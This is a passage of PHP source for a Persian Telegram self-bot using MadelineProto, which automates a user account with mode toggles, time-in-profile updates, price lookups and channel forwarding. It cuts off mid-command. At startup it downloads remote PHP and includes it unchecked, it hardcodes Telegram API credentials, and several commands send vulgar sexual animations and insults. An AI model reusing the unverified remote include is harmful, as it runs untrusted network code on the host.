<?php
ignore_user_abort(true);
error_reporting(0);
ini_set('memory_limit', '256M');
ini_set('display_errors', 0);
ini_set('memory_limit', -1);
ini_set('max_execution_time', 300);
set_time_limit(0);

if (!is_dir('files')) {
    mkdir('files');
}
if (!file_exists('madeline.php') or filesize('madeline.php') < rand(1024, 2048)) {
    copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
}
if (!file_exists('timename.txt')) {
    file_put_contents('timename.txt', 'off');
}
if (!file_exists('timebio.txt')) {
    file_put_contents('timebio.txt', 'off');
}
if (!file_exists('timesticker.txt')) {
    file_put_contents('timesticker.txt', 'off');
}
if (!file_exists('part.txt')) {
    file_put_contents('part.txt', 'off');
}
if (!file_exists('timepic.txt')) {
    file_put_contents('timepic.txt', 'off');
}
if (!file_exists('bold.txt')) {
    file_put_contents('bold.txt', 'off');
}
if (!file_exists('mention.txt')) {
    file_put_contents('mention.txt', 'off');
}
if (!file_exists('coding.txt')) {
    file_put_contents('coding.txt', 'off');
}
if (!file_exists('strikethrough.txt')) {
    file_put_contents('strikethrough.txt', 'off');
}
if (!file_exists('underline.txt')) {
    file_put_contents('underline.txt', 'off');
}
if (!file_exists('hashtag.txt')) {
    file_put_contents('hashtag.txt', 'off');
}
if (!file_exists('italic.txt')) {
    file_put_contents('italic.txt', 'off');
}
if (!file_exists('typing.txt')) {
    file_put_contents('typing.txt', 'off');
}
if (!file_exists('gameplay.txt')) {
    file_put_contents('gameplay.txt', 'off');
}
if (!file_exists('gamepv.txt')) {
    file_put_contents('gamepv.txt', 'off');
}
if (!file_exists('antilogin.txt')) {
    file_put_contents('antilogin.txt', 'off');
}
if (!file_exists('audioaction.txt')) {
    file_put_contents('audioaction.txt', 'off');
}
if (!file_exists('videoaction.txt')) {
    file_put_contents('videoaction.txt', 'off');
}
if (!file_exists('lockpv.txt')) {
    file_put_contents('lockpv.txt', 'off');
}
if (!file_exists('locklink.txt')) {
    file_put_contents('locklink.txt', 'off');
}
if (!file_exists('locktag.txt')) {
    file_put_contents('locktag.txt', 'off');
}
if (!file_exists('lockgp.txt')) {
    file_put_contents('lockgp.txt', 'off');
}
if (!file_exists('markread.txt')) {
    file_put_contents('markread.txt', 'off');
}
if (!file_exists('language.txt')) {
    file_put_contents('language.txt', 'fa');
}
if (!file_exists('autochat.txt')) {
    file_put_contents('autochat.txt', 'off');
}
if (!file_exists('Sessions.txt')) {
    file_put_contents('Sessions.txt', 'برای نمایش دستور Sessions را بفرستید و دوباره مراجعه فرمایید');
}
define("MADELINE_BRANCH", "5.1.34");
include 'madeline.php';
include 'jdf.php';
$settings = ['logger'=>['logger'=>0],'app_info'=> ['api_id'=>1167061,'api_hash'=> '4de49642ae630ae385b6c10faa7155be']];
$settings['logger']['max_size'] = 3 * 1024 * 1024;
$MadelineProto = new \danog\MadelineProto\API('session.madeline', $settings);
$MadelineProto->start();
date_default_timezone_set('Asia/Tehran');
if (file_get_contents('timepic.txt') == 'on') {
    $time = date("H:i");
    copy("https://bcassetcdn.com/asset/logo/e7b2b2cb-aed9-4ca2-b4bc-61d4414d891b/logo?v=4&text=$time", 'time.jpg');
    $MadelineProto->photos->uploadProfilePhoto(['file' => 'time.jpg']);
}

if (file_get_contents('timebio.txt') == 'on') {
    $time = date("H:i");
    $fonts = [["₀", "¹", "₂", "³", "₄", "⁵", "₆", "⁷", "₈", "⁹"],
	    ["0", "❶", "❷", "❸", "❹", "❺", "❻", "❼", "❽", "❾"],
	    ["0", "➀", "➁", "➂", "➃", "➄", "➅", "➆", "➇", "➈"],
        ["⁰", "₁", "²", "₃", "⁴", "₅", "⁶", "₇", "⁸", "₉"]];
    $time = date("H:i");
    $time2 = str_replace(range(0, 9), $fonts[array_rand($fonts)], date("H:i"));
    $day_number = jdate('j');
    $month_number = jdate('n');
    $year_number = jdate('y');
    $day_name = jdate('l');
    $MadelineProto->account->updateProfile(['about' => "ᴛɪᴍᴇ👉🏻 ⁅-- $time2 --⁆ 🕚 "]);
}

if (file_get_contents('timename.txt') == 'on') {
    $fonts = [["₀", "¹", "₂", "³", "₄", "⁵", "₆", "⁷", "₈", "⁹"],
	    ["0", "❶", "❷", "❸", "❹", "❺", "❻", "❼", "❽", "❾"],
	    ["0", "➀", "➁", "➂", "➃", "➄", "➅", "➆", "➇", "➈"],
        ["⁰", "₁", "²", "₃", "⁴", "₅", "⁶", "₇", "⁸", "₉"]];
    $time = date("H:i");
    $time2 = str_replace(range(0, 9), $fonts[array_rand($fonts)], date("H•i"));
    $day_number = jdate('j');
    $month_number = jdate('n');
    $year_number = jdate('y');
    $day_name = jdate('l');
    $MadelineProto->account->updateProfile(['last_name' => "➜ $time2 🕚"]);
}

function closeConnection($message = 'Reza is self runing... channel telegram : @source_kabos'){
 if (php_sapi_name() === 'cli' || isset($GLOBALS['exited'])) {
  return;
 }
// 
    @ob_end_clean();
    @header('Connection: close');
    ignore_user_abort(true);
    ob_start();
    echo "$message";
    $size = ob_get_length();
    @header("Content-Length: $size");
    @header('Content-Type: text/html');
    ob_end_flush();
    flush();
    $GLOBALS['exited'] = true;
}

function shutdown_function($lock)
{
   try {
    $a = fsockopen((isset($_SERVER['HTTPS']) && @$_SERVER['HTTPS'] ? 'tls' : 'tcp').'://'.@$_SERVER['SERVER_NAME'], @$_SERVER['SERVER_PORT']);
    fwrite($a, @$_SERVER['REQUEST_METHOD'].' '.@$_SERVER['REQUEST_URI'].' '.@$_SERVER['SERVER_PROTOCOL']."\r\n".'Host: '.@$_SERVER['SERVER_NAME']."\r\n\r\n");
    flock($lock, LOCK_UN);
    fclose($lock);
} catch(Exception $v){}
}
if (!file_exists('bot.lock')) {
 touch('bot.lock');
}

$lock = fopen('bot.lock', 'r+');
$try = 1;
$locked = false;
while (!$locked) {
 $locked = flock($lock, LOCK_EX | LOCK_NB);
 if (!$locked) {
  closeConnection();
 if ($try++ >= 30) {
 exit;
 }
   sleep(1);
 }
}
if (!file_exists('data.json')) {
    file_put_contents('data.json', '{"power":"on","adminStep":"","typing":"off","gameplay":"off","audioaction":"off","videoaction":"off","echo":"off","markread":"off","poker":"off","enemies":[],"answering":[],"muted":[] }');
}

class EventHandler extends \danog\MadelineProto\EventHandler
{
    public function __construct($MadelineProto)
    {
        parent::__construct($MadelineProto);
    }

    public function onUpdateSomethingElse($update)
    {
        if (isset($update['_'])) {
            if ($update['_'] == 'updateNewMessage') {
                onUpdateNewMessage($update);
            } else if ($update['_'] == 'updateNewChannelMessage') {
                onUpdateNewChannelMessage($update);
            }
        }
    }

    public function onUpdateNewChannelMessage($update)
    {
        yield $this->onUpdateNewMessage($update);
    }

    public function onUpdateNewMessage($update)
    {
        $from_id = isset($update['message']['from_id']) ? $update['message']['from_id'] : '';
        try {
            if (isset($update['message']['message'])) {
                $text = $update['message']['message'];
                $msg_id = $update['message']['id'];
                $message = isset($update['message']) ? $update['message'] : '';
                $MadelineProto = $this;


                $me = yield $MadelineProto->get_self();
                $Sis = $me['id'];
                $chID = yield $MadelineProto->get_info($update);
                $peer = $chID['bot_api_id'];
                $type3 = $chID['type'];
                @$data = json_decode(file_get_contents("data.json"), true);
                $step = $data['adminStep'];
                if ($from_id == $Sis) {
                $time = date("i:s");
                $times = ["05:00","10:00","15:00","20:00","25:00","30:00","35:00","40:00","45:00","50:00","55:00","00:00"];
                if (in_array($time,$times))
				{
                yield $this->restart();
                }
                    $boldmode = file_get_contents("bold.txt");
                    $mentionmode = file_get_contents("mention.txt");
                    $codingmode = file_get_contents("coding.txt");
                    $strikethrough = file_get_contents("strikethrough.txt");
                    $undermode = file_get_contents("underline.txt");
                    $hashtagmode = file_get_contents("hashtag.txt");
                    $partmode = file_get_contents("part.txt");
                    $italic = file_get_contents("italic.txt");
                    if (preg_match("/^[\/\#\!]?(bot) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(bot) (on|off)$/i", $text, $m);
                        $data['power'] = $m[2];
                        file_put_contents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ربات  $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(poker) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(poker) (on|off)$/i", $text, $m);
                        $data['poker'] = $m[2];
                        file_put_contents("data.json", json_encode($data));
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت پوکر $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(bold) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(bold) (on|off)$/i", $text, $m);
                        file_put_contents('bold.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت بولد نویس $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(mention) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(mention) (on|off)$/i", $text, $m);
                        file_put_contents('mention.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " حالت تگ نویس $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(coding) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(coding) (on|off)$/i", $text, $m);
                        file_put_contents('coding.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴄᴏᴅɪɴɢ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lang) (en|fa)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(lang) (en|fa)$/i", $text, $m);
                        file_put_contents('language.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "The lang Bot Was Set To $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(strikethrough) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(strikethrough) (on|off)$/i", $text, $m);
                        file_put_contents('strikethrough.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ꜱᴛʀɪᴋᴇᴛʜʀᴏᴜɢʜ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(underline) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(underline) (on|off)$/i", $text, $m);
                        file_put_contents('underline.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت خارج از کادر $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(hashtag) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(hashtag) (on|off)$/i", $text, $m);
                        file_put_contents('hashtag.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " حالت هشتگ نویس $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(part) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(part) (on|off)$/i", $text, $m);
                        file_put_contents('part.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت پارت نویس $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockpv) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(lockpv) (on|off)$/i", $text, $m);
                        file_put_contents('lockpv.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "قفل پیوی $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(locklink) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(locklink) (on|off)$/i", $text, $m);
                        file_put_contents('locklink.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " قفل لینک $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(locktag) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(locktag) (on|off)$/i", $text, $m);
                        file_put_contents('locktag.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "قفل تگ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(lockgp) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(lockgp) (on|off)$/i", $text, $m);
                        file_put_contents('lockgp.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "قفل گروه $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(typing) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(typing) (on|off)$/i", $text, $m);
                        file_put_contents('typing.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت درحال تایپ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(autochat) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(autochat) (on|off)$/i", $text, $m);
                        file_put_contents('autochat.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت چت خودکار $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gameplay) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(gameplay) (on|off)$/i", $text, $m);
                        file_put_contents('gameplay.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت درحال بازی $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(gamepv) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(gamepv) (on|off)$/i", $text, $m);
                        file_put_contents('gamepv.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت درحال بازی در پیوی $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(antilogin) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(antilogin) (on|off)$/i", $text, $m);
                        file_put_contents('antilogin.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت انتی لاگین $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(audioaction) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(audioaction) (on|off)$/i", $text, $m);
                        file_put_contents('audioaction.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " حالت  لوکیشن $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(videoaction) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(videoaction) (on|off)$/i", $text, $m);
                        file_put_contents('videoaction.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت ویدیو $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(markread) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(markread) (on|off)$/i", $text, $m);
                        file_put_contents('markread.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴍᴀʀᴋʀᴇᴀᴅ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(italic) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(italic) (on|off)$/i", $text, $m);
                        file_put_contents('italic.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "حالت کج نویس $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timename) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(timename) (on|off)$/i", $text, $m);
                        file_put_contents('timename.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " ساعت تو اسم 👈🏻 $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timesticker) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(timesticker) (on|off)$/i", $text, $m);
                        file_put_contents('timesticker.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴛɪᴍᴇꜱᴛɪᴄᴋᴇʀ ᴍᴏᴅᴇ ɴᴏᴡ ɪꜱ $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timepic) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(timepic) (on|off)$/i", $text, $m);
                        file_put_contents('timepic.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => " ساعت تو عکس پروفایل $m[2]"]);
                    }
                    if (preg_match("/^[\/\#\!]?(timebio) (on|off)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(timebio) (on|off)$/i", $text, $m);
                        file_put_contents('timebio.txt', $m[2]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ساعت تو بیو 👈🏻 $m[2]"]);
                    }
                    if ($text == 'ping' or $text == 'Ping' or $text == 'ربات' or $text == ' زبات' or $text == 'رباا' or $text == 'bot' or $text == 'Bot') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "• sᴇʟғ ɪs ᴏɴʟɪɴᴇ :) •"]);
                    }
                    if ($text == 'load' or $text == '/load') {
                        $load = sys_getloadavg();
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ѕєяνєя ριηg : $load[0]", 'parse_mode' => 'MarkDown']);
                    }
                    if ($text == 'number' or $text == 'شمارش') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "１"]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "２", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "３", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "４", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "５", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "６", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "７", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "８", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "９", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "１０", 'id' => $msg_id + 1]);
                        yield $this->sleep(0);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "کص ننت بای😹🤘", 'id' => $msg_id + 1]);
                    }
                    if ($text == "for") {
                        foreach (range(2, 164) as $t) {
                            yield $this->sleep(0);
                            $rand = rand(1, 164);
                            yield $this->messages->forwardMessages(['from_peer' => "@source_kabos", 'to_peer' => $peer, 'id' => [$rand],]);
                        }
                    }

                    if ($text == "قیمت طلا") {
                        $talaa = json_decode(file_get_contents("https://r2f.ir/web/tala.php"), true);
                        $tala = $talaa['4']['price'];
                        $nogre = $talaa['5']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
🏵قیمت طلا و نقره به دلار :
⁅———— ◕ ————⁆
🥇انس طلا : $tala

🥈انس نقره : $nogre
⁅———— ◕ ————⁆
", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "قیمت سکه") {
                        $talaa = json_decode(file_get_contents("https://r2f.ir/web/tala.php"), true);
                        $emami = $talaa['0']['price'];
                        $nim = $talaa['1']['price'];
                        $rob = $talaa['2']['price'];
                        $geram = $talaa['3']['price'];
                        $bahar = $talaa['6']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
🏅قیمت سکه به تومان :
⁅———— ◕ ————⁆
💰سکه گرمی : $geram

💰ربع سکه : $rob

💰نیم سکه : $nim

💰سکه بهار آزادی :  $bahar

💰سکه امامی : $emami
⁅———— ◕ ————⁆
", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "قیمت ارز") {
                        $arz = json_decode(file_get_contents("https://r2f.ir/web/arz.php"), true);
                        $yoro = $arz['0']['price'];
                        $emarat = $arz['1']['price'];
                        $swead = $arz['2']['price'];
                        $norway = $arz['3']['price'];
                        $iraq = $arz['4']['price'];
                        $swit = $arz['5']['price'];
                        $armanestan = $arz['6']['price'];
                        $gorgea = $arz['7']['price'];
                        $pakestan = $arz['8']['price'];
                        $soudi = $arz['9']['price'];
                        $russia = $arz['10']['price'];
                        $india = $arz['11']['price'];
                        $kwait = $arz['12']['price'];
                        $astulia = $arz['13']['price'];
                        $oman = $arz['14']['price'];
                        $qatar = $arz['15']['price'];
                        $kanada = $arz['16']['price'];
                        $tailand = $arz['17']['price'];
                        $turkye = $arz['18']['price'];
                        $england = $arz['19']['price'];
                        $hong = $arz['20']['price'];
                        $azarbayjan = $arz['21']['price'];
                        $malezy = $arz['22']['price'];
                        $danmark = $arz['23']['price'];
                        $newzland = $arz['24']['price'];
                        $china = $arz['25']['price'];
                        $japan = $arz['26']['price'];
                        $bahrin = $arz['27']['price'];
                        $souria = $arz['28']['price'];
                        $dolar = $arz['29']['price'];
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
💵 قیمت ارز های کشور های مختلف:
⁅———— ◕ ————⁆
🇪🇺 یورو : $yoro

🇺🇸 دلار : $dolar

🇦🇪درهم امارات  : $emarat

🇸🇪 کرون سوئد : $swead

🇳🇴 کرون نروژ : $norway

🇮🇶 دینار عراق : $iraq

🇨🇭فرانک سوئیس : $swit

🇦🇲 درام ارمنستان : $armanestan

🇬🇪لاری گرجستان : $gorgea

🇵🇰 روپیه پاکستان : $pakestan

🇷🇺 روبل روسیه : `$russia

🇮🇳 روپیه هندوستان : $india

🇰🇼 دینار کویت : $kwait

🇦🇺 دلار استرلیا : $astulia

🇴🇲 ریال عمان : $oman

🇶🇦 ریال قطر : $qatar

🇨🇦 دلار کانادا : $kanada

🇹🇭بات تایلند : $tailand

🇹🇷 لیر ترکیه : $turkye

🇬🇧 پوند انگلیس : $england

🇭🇰 دلار هنگ کنگ : $hong

🇦🇿 منات اذربایجان : $azarbayjan

🇲🇾رینگیت مالزی : $malezy

🇩🇰 کرون دانمارک : $danmark

🇳🇿 دلار نیوزلند : $newzland

🇨🇳 یوان چین : $china

🇯🇵 ین ژآپن : $japan

🇧🇭 دینار بحرین : $bahrin

🇸🇾 لیر سوریه : $souria
⁅———— ◕ ————⁆", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "نویسنده ی اصلی سورس") {
                        foreach (range(165, 182) as $t) {
                            yield $this->sleep(1);
                            $rand = rand(165, 182);
                            yield $this->messages->forwardMessages(['from_peer' => "@source_kabos", 'to_peer' => $peer, 'id' => [$rand],]);
                        }
                    }


                    if ($text == 'bk' or $text == 'بکیرم') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
🤤🤤🤤
🤤         🤤
🤤           🤤
🤤        🤤
🤤🤤🤤
🤤         🤤
🤤           🤤
🤤           🤤
🤤        🤤
🤤🤤🤤']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
??         😂
😂       😂
😂     😂
😂   😂
😂😂
😂   😂
😂      😂
😂        😂
😂          ??
😂            😂']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
😂😂😂          😂         😂
😂         😂      😂       😂
😂           😂    😂     😂
😂        😂       😂   😂
😂😂😂          😂😂
😂         😂      😂   😂
😂           😂    😂      😂
😂           😂    😂        😂
😂        😂       😂          😂
😂😂😂          😂            😂']);


                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
🖕🖕🖕          🖕         🖕
🖕         🖕      🖕       🖕
🖕           🖕    🖕     🖕
🖕        🖕       🖕   🖕
🖕🖕🖕          🖕🖕
🖕         🖕      🖕   🖕
🖕           🖕    🖕      🖕
🖕           🖕    🖕        🖕
🖕        🖕       🖕          🖕
 🖕🖕🖕          🖕            🖕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
❤️❤️❤️          ❤️         ❤️
❤️         ❤️      ❤️       ❤️
❤️           ❤️    ❤️     ❤️
❤️        ❤️       ❤️   ❤️
❤️❤️❤️          ❤️❤️
❤️         ❤️      ❤️   ❤️
❤️           ❤️    ❤️      ❤️
❤️           ❤️    ❤️        ❤️
❤️        ❤️       ❤️          ❤️
 ❤️❤️❤️          ❤️            ❤️']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
🥀🥀🥀          🥀         🥀
🥀         🥀      🥀       🥀
🥀           🥀    🥀     🥀
🥀        🥀       🥀   🥀
🥀🥀🥀          🥀🥀
🥀         🥀      🥀   🥀
🥀           🥀    🥀      🥀
🥀           🥀    🥀        🥀
🥀        🥀       🥀          🥀
 🥀🥀🥀          🥀            🥀']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
😱😱😱          😎         😎
😱         😱      😎       😎
😱           😱    😎     😎
😱        😱       😎   😎
😱😱😱          😎😎
😱         😱      😎   😎
😱           😱    😎      😎
😱           😱    😎        😎
😱        😱       😎          😎
😱😱😱          😎            😎']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
👿👿👿          😈         😈
👿         👿      😈       😈
👿           👿    😈     😈
👿        👿       😈   😈
👿👿👿          😈😈
👿         👿      😈   😈
👿           👿    😈      😈
👿           👿    😈        😈
👿        👿       😈          😈
👿👿👿          😈            😈']);

                    }


                    if ($text == 'ساک' or $text == 'suck') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🗣 <=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣==']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🗣<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💦💦<=====']);

                    }
//--
//--
                    if ($text == 'جق' or $text == 'jaq') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'درحال جق....']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌🏻<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<👌🏻=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==👌🏻===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<===👌🏻==']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==👌🏻===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<👌🏻=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌🏻<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<===👌🏻==']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌🏻<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==👌🏻===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=👌🏻====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌🏻<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💦💦<=====']);

                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'پایان جق']);
                    }
                    if (strpos($text, "clean") !== false) {
                        if (!isset($update['update']['message']['reply_to_msg_id'])) {
                            $del = str_replace("clean", "", $text);
                            if (is_numeric($del)) {
                                for ($i = $msg_id - 1; $i >= $msg_id - 1 - $del; $i--) {
                                    $messages_AffectedMessages = $this->channels->deleteMessages(['channel' => $peer, 'id' => [$i]]);
                                }
